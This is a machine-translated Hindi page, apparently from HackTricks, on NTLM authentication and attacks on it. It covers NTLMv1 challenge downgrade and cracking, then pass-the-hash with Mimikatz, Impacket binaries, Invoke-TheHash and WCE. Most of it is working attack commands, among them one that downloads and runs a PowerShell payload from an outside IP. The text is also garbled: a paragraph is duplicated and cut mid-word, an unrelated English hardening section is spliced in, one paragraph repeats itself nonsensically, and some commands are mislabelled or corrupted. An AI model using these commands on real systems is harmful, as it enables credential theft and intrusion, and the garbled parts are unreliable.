# NTLM

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर फॉलो करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**।**
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो में PR जमा करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>

## मूल जानकारी

जहां **Windows XP और Server 2003** कार्यरत हैं, वहां LM (Lan Manager) हैश का उपयोग किया जाता है, हालांकि यह सामान्य रूप से मान्य है कि इन्हें आसानी से ध्वस्त किया जा सकता है। विशेष रूप से एक ऐसा LM हैश, `AAD3B435B51404EEAAD3B435B51404EE`, एक स्थिति को दर्शाता है जहां LM का उपयोग नहीं है, जो एक खाली स्ट्रिंग के लिए हैश को प्रतिनिधित्व करता है।

डिफ़ॉल्ट रूप से, **कर्बेरोस** प्रमाणीकरण प्रोटोकॉल प्रमुख रूप से उपयोग किया जाता है। NTLM (NT LAN Manager) विशेष परिस्थितियों में आता है: Active Directory की अनुपस्थिति, डोमेन की अस्तित्व न होना, कर्बेरोस का गलत विन्यास के कारण असफलता, या जब कनेक्शन IP पते का उपयोग करके मान्य होस्टनाम की बजाय किया जाता है।

नेटवर्क पैकेट्स में **"NTLMSSP"** हेडर की उपस्थिति NTLM प्रमाणीकरण प्रक्रिया की संकेत देती है।

एलएम, NTLMv1, और NTLMv2 प्रोटोकॉल का समर्थन एक विशेष DLL द्वारा सुविधित है जो `%windir%\Windows\System32\msv1\_0.dll` पर स्थित है।

**मुख्य बिंदु**:

* एलएम हैश विकल्पशील हैं और एक खाली एलएम हैश (`AAD3B435B51404EEAAD3B435B51404EE`) इसके अपयोग का संकेत देता है।
* कर्बेरोस डिफ़ॉल्ट प्रमाणीकरण विधि है, NTLM केवल निश्चित परिस्थितियों में उपयोग किया जाता है।
* NTLM प्रमाणीकरण पैकेट्स "NTLMSSP" हेडर द्वारा पहचानी जा सकती हैं।
* एलएम, NTLMv1, और NTLMv2 प्रोटोकॉल सिस्टम फ़ाइल `msv1\_0.dll` द्वारा समर्थित हैं।

## LM, NTLMv1 और NTLMv2

आप जांच और कॉन्फ़िगर कर सकते हैं कि कौन सा प्रोटोकॉल उपयोग किया जाएगा:

### GUI

_secpol.msc_ चलाएं -> स्थानीय नीतियाँ -> सुरक्षा विकल्प -> नेटवर्क सुरक्षा: LAN Manager प्रमाणीकरण स्तर। यहाँ 6 स्तर हैं (0 से 5 तक)।

![](<../../.gitbook/assets/image (919).png>)

### रजिस्ट्री

यह स्तर 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## बेसिक NTLM डोमेन प्रमाणीकरण योजना

1. **उपयोगकर्ता** अपने **प्रमाणपत्र** प्रस्तुत करता है
2. क्लाइंट मशीन **प्रमाणीकरण अनुरोध भेजती है** जिसमें **डोमेन नाम** और **उपयोगकर्ता नाम** भेजती है
3. **सर्वर** चुनौती भेजता है
4. **क्लाइंट** चुनौती को **पासवर्ड के हैश का उपयोग करके एन्क्रिप्ट** करता है और इसे प्रतिक्रिया के रूप में भेजता है
5. **सर्वर** **डोमेन कंट्रोलर** को **डोमेन नाम, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया** भेजता है। यदि **सक्रिय निर्देशिका** कॉन्फ़िगर नहीं है या डोमेन नाम सर्वर का नाम है, तो प्रमाणपत्र **स्थानीय रूप से जांची जाती है**।
6. **डोमेन कंट्रोलर** जांचता है कि सब कुछ सही है और सर्वर को जानकारी भेजता है

**सर्वर** और **डोमेन कंट्रोलर** को **नेटलॉगन** सर्वर के माध्यम से **सुरक्षित चैनल** बनाने में सक्षम होते हैं क्योंकि डोमेन कंट्रोलर सर्वर के पासवर्ड को जानता है (यह **NTDS.DIT** डेटाबेस में है)।

### स्थानीय NTLM प्रमाणीकरण योजना

प्रमाणीकरण वही है जैसा **पहले उल्लिखित** किया गया है, लेकिन **सर्वर** उस **उपयोगकर्ता के हैश को जानता है** जो प्रमाणीकरण करने की कोशिश कर रहा है। इसलिए, डोमेन कंट्रोलर से पूछने की बजाय, **सर्वर खुद की जांच करेगा** कि क्या उपयोगकर्ता प्रमाणीकृत कर सकता है।

### NTLMv1 चुनौती

**चुनौती लंबाई 8 बाइट** है और **प्रतिक्रिया 24 बाइट** लंबी है।

**हैश NT (16 बाइट)** को **3 हिस्सों में विभाजित किया जाता है (प्रत्येक 7 बाइट)**: **आखिरी हिस्सा शून्यों से भरा होता है**। फिर, **चुनौती** को प्रत्येक हिस्से के साथ अलग-अलग **एन्क्रिप्ट** किया जाता है और परिणामी एन्क्रिप्टेड बाइट्स **जोड़ी जाती हैं**। कुल: 8 बी + 8 बी + 8 बी = 24 बाइट।

**समस्याएं**:

* **अनियमितता की कमी**
* 3 हिस्से अलग-अलग **हमले किए जा सकते हैं** ताकि NT हैश पता लगाया जा सके
* **DES को क्रैक किया जा सकता है**
* 3 वां कुंजी हमेशा **5 शून्यों** से मिलकर बनाई जाती है।
* **एक ही चुनौती** दिया जाएगा तो **प्रतिक्रिया** **समान** होगी। इसलिए, आप पीड़ित को **पूर्व-गणना रेनबो टेबल** का उपयोग करके उपहार के रूप में चुनौती दे सकते हैं "**1122334455667788**" और प्रतिक्रिया पर हमला कर सकते हैं।

### NTLMv1 हमला

आजकल अनकंफ़ाइन्ड डेलीगेशन कॉन्फ़िगर वातावरण पाना कम हो रहा है, लेकिन यह यह नहीं मतलब है कि आप **प्रिंट स्पूलर सेवा** का दुरुपयोग नहीं कर सकते।

आप AD पर पहले से कुछ प्रमाणपत्र/सत्र दुरुपयोग कर सकते हैं जिन्हें आपके नियंत्रण के तहत किसी **होस्ट के खिलाफ प्रमाणीकरण करने के लिए प्रिंटर से पूछ सकते हैं**। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788** सेट कर सकते हैं, प्रमाणीकरण प्रयास को कैप्चर कर सकते हैं, और यदि यह **NTLMv1** का उपयोग करके किया गया था तो आप इसे **क्रैक** कर सकेंगे।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप \*\*ध्वज `--lm` \*\* का प्रयास कर सकते हैं **प्रमाणीकरण** को **डाउनग्रेड** करने के लिए।\
_ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण को NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

ध्यान रखें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाता का उपयोग करेगा, और कंप्यूटर खाते का उपयोग **लंबा और यादृच्छिक पासवर्ड** करते हैं जिसे आप **सामान्य शब्दकोश** का उपयोग करके **क्रैक नहीं कर पाएंगे**। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([अधिक जानकारी यहाँ](./#ntlmv1-challenge)), इसलिए कुछ विशेष रूप से DES को क्रैक करने के लिए सेवाओं का उपयोग करके आप इसे क्रैक कर सकेंगे (आप [https://crack.sh/](https://crack.sh) या [https://ntlmv1.com/](https://ntlmv1.com) का उपयोग कर सकते हैं)।

### hashcat के साथ NTLMv1 हमला

NTLMv1 को NTLMv1 मल्टी टूल [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) के साथ भी तोड़ा जा सकता है जो NTLMv1 संदेशों को एक ऐसी विधि में स्वरूपित करता है जिसे hashcat के साथ तोड़ा जा सकता है।

आजकल अनकंफ़ाइन्ड डेलीगेशन कॉन्फ़िगर वातावरण पाना कम हो रहा है, लेकिन यह यह नहीं मतलब है कि आप **प्रिंट स्पूलर सेवा** का दुरुपयोग नहीं कर सकते।

आप AD पर पहले से कुछ प्रमाणपत्र/सत्र दुरुपयोग कर सकते हैं जिन्हें आपके नियंत्रण के तहत किसी **होस्ट के खिलाफ प्रमाणीकरण करने के लिए प्रिंटर से पूछ सकते हैं**। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788** सेट कर सकते हैं, प्रमाणीकरण प्रयास को कैप्चर कर सकते हैं, और यदि यह **NTLMv1** का उपयोग करके किया गया था तो आप इसे **क्रैक** कर सकेंगे।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप \*\*ध्वज `--lm` \*\* का प्रयास कर सकते हैं **प्रमाणीकरण** को **डाउनग्रेड** करने के लिए।\
_ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण को NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

ध्यान रखें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाता का उपयोग करेगा, और कंप्यूटर खाते का उपयोग **लंबा और यादृच्छिक पासवर्ड** करते हैं जिसे आप **सामान्य शब्दकोश** का उपयोग करके **क्रैक नहीं कर पाएंगे**। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([अधिक जानकारी यहाँ](./#ntlmv1-challenge)), इसलिए कुछ विशेष रूप से DES को क्रैक करने के लिए सेवाओं का उपयोग करके आप इसे क्रैक कर सकेंगे (आप [https://crack.sh/](https://crack.sh) या [https://ntlmv1.com/](https://ntlmv1.com) का उपयोग क
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
नीचे दिया गया आउटपुट होगा:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM

## NTLM Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for authentication purposes.

## NTLM Weaknesses

NTLM has several weaknesses that make it vulnerable to attacks, including:

- **Pass-the-Hash**: Attackers can use the hash of a user's password to authenticate as that user without knowing the actual password.
- **Pass-the-Ticket**: Attackers can use stolen ticket-granting tickets to authenticate to services.
- **Relay Attacks**: Attackers can relay authentication attempts to gain unauthorized access.

## NTLM Hardening

To mitigate the weaknesses of NTLM, consider implementing the following security measures:

- **Disable NTLM**: Whenever possible, disable NTLM authentication in favor of more secure protocols like Kerberos.
- **Enforce Complex Passwords**: Require users to use complex and unique passwords to make pass-the-hash attacks more difficult.
- **Enable SMB Signing**: Require SMB signing to protect against relay attacks.
- **Enable LDAP Signing**: Require LDAP signing to protect against man-in-the-middle attacks.

By implementing these hardening measures, you can improve the security of your Windows environment and reduce the risk of NTLM-related attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
वितरित हैशकैट (hashtopolis जैसे एक उपकरण के माध्यम से सर्वोत्तम) चलाएं क्योंकि अन्यथा यह कई दिन ले सकता है।
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस मामले में हमें इसका पासवर्ड पता है कि 'पासवर्ड' है, इसलिए हम डेमो के उद्देश्यों के लिए धोखा देंगे:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
हमें अब hashcat-utilities का उपयोग करना होगा ताकि क्रैक किए गए des कुंजी को NTLM हैश के हिस्सों में बदला जा सके:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
अंत में आखिरकार आखिरी भाग:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM विशेषज्ञता

यह विशेषज्ञता NTLM हैंडशेक्स को कैप्चर करने के लिए एक उपकरण है जो एक नेटवर्क में एक्टिव डायरेक्टरी क्रेडेंशियल्स को चुराने के लिए उपयोग किया जा सकता है। यह उपकरण एक नेटवर्क में NTLM हैंडशेक्स को अद्वितीयता और अद्वितीयता के साथ कैप्चर करने के लिए डिज़ाइन किया गया है।

यह उपकरण एक नेटवर्क में NTLM हैंडशेक्स को अद्वितीयता और अद्वितीयता के साथ कैप्चर करने के लिए डिज़ाइन किया गया है।
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**चुनौती की लंबाई 8 बाइट है** और **2 प्रतिक्रियाएँ भेजी जाती हैं**: एक **24 बाइट** लंबी है और **दूसरी** की लंबाई **विविध** है।

**पहली प्रतिक्रिया** को **HMAC\_MD5** का उपयोग करके बनाया जाता है, जिसमें **क्लाइंट और डोमेन** से मिलकर बनी **स्ट्रिंग** को और **कुंजी** के रूप में **NT हैश** का **हैश MD4** का उपयोग किया जाता है। फिर, **परिणाम** का उपयोग करके **कुंजी** को चिपटाने के लिए **HMAC\_MD5** का उपयोग किया जाएगा। इसमें, **8 बाइट का एक क्लाइंट चुनौती जोड़ा जाएगा**। कुल: 24 बी।

**दूसरी प्रतिक्रिया** को बनाने के लिए **कई मान** का उपयोग किया जाता है (एक नया क्लाइंट चुनौती, एक **समय-चिह्न** को **पुनरावृत्ति हमलों** से बचाने के लिए...)

यदि आपके पास एक **pcap है जिसने एक सफल प्रमाणीकरण प्रक्रिया को कैप्चर किया है**, तो आप इस गाइड का पालन करके डोमेन, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया प्राप्त कर सकते हैं और पासवर्ड को तोड़ने का प्रयास कर सकते हैं: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**जब आपके पास पीड़ित का हैश होता है**, तो आप इसका उपयोग **अनुकरण** करने के लिए कर सकते हैं।\
आपको एक **उपकरण** का उपयोग करना होगा जो **उस हैश का उपयोग करके NTLM प्रमाणीकरण करेगा**, **या** आप एक नया **सत्रलॉगऑन** बना सकते हैं और **LSASS** में उस **हैश** को **इंजेक्ट** कर सकते हैं, ताकि जब भी कोई **NTLM प्रमाणीकरण किया जाता है**, तो उस **हैश का उपयोग किया जाएगा।** आखिरी विकल्प है वह क्या करता है।

**कृपया ध्यान दें कि आप कंप्यूटर खातों का उपयोग करके भी पास-द-हैश हमले कर सकते हैं।**

### **Mimikatz**

**व्यवस्थापक के रूप में चलाने की आवश्यकता है**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह एक प्रक्रिया को शुरू करेगा जो उन उपयोगकर्ताओं के नाम पर होगी जिन्होंने मिमीकैट्ज लॉन्च किया है, लेकिन LSASS में सहेजे गए क्रेडेंशियल्स मिमीकैट्ज पैरामीटर्स के अंदर होंगे। फिर, आप नेटवर्क संसाधनों तक पहुंच सकते हैं जैसे कि आप उस उपयोगकर्ता हो (जैसे `runas /netonly` ट्रिक, लेकिन आपको plain-text पासवर्ड पता नहीं होना चाहिए)।

### लिनक्स से पास-द-हैश

आप लिनक्स से पास-द-हैश का उपयोग करके Windows मशीनों में कोड निष्पादन प्राप्त कर सकते हैं।\
[**यहाँ क्लिक करें और इसे कैसे करें सीखें।**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows कंपाइल्ड उपकरण

आप यहाँ से [Windows के लिए Impacket बाइनरी डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)।

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (इस मामले में आपको एक कमांड निर्दिष्ट करने की आवश्यकता है, cmd.exe और powershell.exe एक इंटरैक्टिव शैली प्राप्त करने के लिए मान्य नहीं हैं)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* कई अन्य Impacket बाइनरी हैं...

### Invoke-TheHash

आप यहाँ से पावरशेल स्क्रिप्ट प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इनवोक-डब्ल्यूएमआईइक्ज़ीक्‍यूट
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इनवोक-एसएमबीक्लाइंट
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### इनवोक-एसएमबीईनुम
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह फ़ंक्शन **सभी अन्य** का **मिश्रण** है। आप **कई होस्ट** पास कर सकते हैं, **किसी को छोड़ सकते हैं** और **वह विकल्प चुन सकते हैं** जिसका आप उपयोग करना चाहते हैं (_SMBExec, WMIExec, SMBClient, SMBEnum_). अगर आप **SMBExec** और **WMIExec** में से **किसी भी** को चुनते हैं लेकिन आप कोई _**कमांड**_ पैरामीटर नहीं देते हैं तो यह बस **जांचेगा** कि क्या आपके पास **पर्याप्त अनुमतियाँ** हैं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [ईविल-विनआरएम पास द हैश](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**व्यवस्थापक के रूप में चलाया जाना चाहिए**

यह उपकरण मिमीकेट्ज़ (LSASS मेमोरी को संशोधित करना) की तरही काम करेगा।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### मैनुअल Windows रिमोट एक्जीक्यूशन उपयोगकर्ता नाम और पासवर्ड के साथ

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## एक Windows होस्ट से क्रेडेंशियल्स निकालना

**अधिक जानकारी के लिए** [**एक Windows होस्ट से क्रेडेंशियल्स प्राप्त करने के बारे में आपको इस पृष्ठ को पढ़ना चाहिए**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM रिले और रिस्पॉन्डर

**इन हमलों को कैसे करना है, इसके बारे में अधिक विस्तृत गाइड के लिए यहाँ पढ़ें:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## नेटवर्क कैप्चर से NTLM चैलेंज पार्स करें

**आप इस्तेमाल कर सकते हैं** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
